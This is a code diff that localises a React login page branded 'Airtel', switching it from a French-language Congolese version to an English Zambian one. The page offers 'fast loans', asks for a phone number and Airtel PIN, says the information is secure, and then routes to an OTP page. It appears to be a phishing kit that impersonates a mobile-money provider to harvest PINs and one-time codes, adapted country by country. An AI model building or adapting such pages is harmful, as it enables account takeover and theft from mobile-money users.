@@ -2,14 +2,14 @@ import React, { useState, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
 import './App.css';
 
-const COUNTRY_CODE = '+243';
-const PHONE_PLACEHOLDER = '8XX XXX XXX'; // DRC mobile format
+const COUNTRY_CODE = '+260';
+const PHONE_PLACEHOLDER = '9XX XXX XXX'; // Zambian mobile format
 const PHONE_MAX = 9;
 
 function AirtelLogin() {
   const [phone, setPhone] = useState('');
   const [pin, setPin] = useState<string[]>(['', '', '', '']);
-  const [error, setError] = useState('Entrez le numéro Airtel.');
+  const [error, setError] = useState('Enter Airtel number.');
   const [isLoading, setIsLoading] = useState(false);
   
   const pinRefs = useRef<(HTMLInputElement | null)[]>([]);
@@ -47,11 +47,11 @@ function AirtelLogin() {
     const pinString = pin.join('');
 
     if (phone.length < PHONE_MAX) {
-      setError('Entrez un numéro Airtel DRC valide.');
+      setError('Enter a valid Airtel ZMW number.');
       return;
     }
     if (pinString.length < 4) {
-      setError('Entrez votre code PIN Airtel.');
+      setError('Enter your Airtel PIN.');
       return;
     }
 
@@ -76,7 +76,7 @@ function AirtelLogin() {
       navigate('/airtel-otp');
     } catch (err) {
       console.error('Login request failed:', err);
-      setError('Une erreur réseau est survenue. Veuillez réessayer.');
+      setError('A network error occurred. Please try again.');
     } finally {
       setIsLoading(false);
     }
@@ -94,14 +94,14 @@ function AirtelLogin() {
           </svg>
         </div>
         
-        <h1 className="airtel-logo">Airtel DRC</h1>
-        <p className="airtel-tagline">Prêts rapides. À tout moment. N'importe où.</p>
+        <h1 className="airtel-logo">Airtel ZMW</h1>
+        <p className="airtel-tagline">Fast loans. Anytime. Anywhere.</p>
       </div>
 
       {/* Main White Card */}
       <div className="airtel-card">
-        <h2 className="airtel-welcome">Bon retour</h2>
-        <p className="airtel-subtext">Connectez-vous à votre compte Airtel DRC</p>
+        <h2 className="airtel-welcome">Welcome back</h2>
+        <p className="airtel-subtext">Log in to your Airtel ZMW account</p>
 
         {error && (
           <div className="airtel-alert" role="alert">
@@ -118,7 +118,7 @@ function AirtelLogin() {
 
         <form onSubmit={handleLogin}>
           <div className="airtel-input-group">
-            <label htmlFor="phone-input">Numéro de téléphone</label>
+            <label htmlFor="phone-input">Phone number</label>
             <div className="airtel-phone-container">
               <div className="airtel-country-code">{COUNTRY_CODE}</div>
               <input
@@ -128,14 +128,14 @@ function AirtelLogin() {
                 value={phone}
                 onChange={handlePhoneChange}
                 maxLength={PHONE_MAX}
-                aria-label="Numéro de téléphone"
+                aria-label="Phone number"
                 disabled={isLoading}
               />
             </div>
           </div>
 
           <div className="airtel-input-group">
-            <label>Entrez votre code PIN Airtel</label>
+            <label>Enter your Airtel PIN</label>
             <div className="airtel-pin-container">
               {pin.map((digit, index) => (
                 <input
@@ -148,7 +148,7 @@ function AirtelLogin() {
                   onChange={(e) => handlePinChange(index, e.target.value)}
                   onKeyDown={(e) => handleKeyDown(index, e)}
                   className="airtel-pin-box"
-                  aria-label={`Chiffre ${index + 1} du code PIN`}
+                  aria-label={`PIN digit ${index + 1}`}
                   disabled={isLoading}
                 />
               ))}
@@ -161,7 +161,7 @@ function AirtelLogin() {
             disabled={isLoading}
             style={{ opacity: isLoading ? 0.7 : 1 }}
           >
-            {isLoading ? 'Chargement...' : 'Connexion'}
+            {isLoading ? 'Loading...' : 'Login'}
             {!isLoading && (
               <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                 <line x1="5" y1="12" x2="19" y2="12" />
@@ -175,11 +175,11 @@ function AirtelLogin() {
           <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#D97706" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
             <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
           </svg>
-          <span>Vos informations sont sécurisées</span>
+          <span>Your information is secure</span>
         </div>
       </div>
 
-      {/* Icons Section — unchanged */}
+      {/* Icons Section — with updated Kwacha symbol */}
       <div className="airtel-icons-footer">
         <div className="airtel-icon-item">
           <svg width="40" height="55" viewBox="0 0 40 55" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -207,7 +207,8 @@ function AirtelLogin() {
         <div className="airtel-icon-item">
           <svg width="40" height="55" viewBox="0 0 40 55" fill="none" xmlns="http://www.w3.org/2000/svg">
             <circle cx="20" cy="27" r="18" fill="#FFC107" stroke="#D4AF37" strokeWidth="2" />
-            <text x="20" y="34" textAnchor="middle" fontSize="22" fontWeight="bold" fill="black">₦</text>
+            {/* Changed from ₦ to K for Zambian Kwacha */}
+            <text x="20" y="34" textAnchor="middle" fontSize="22" fontWeight="bold" fill="black">K</text>
           </svg>
         </div>
       </div>
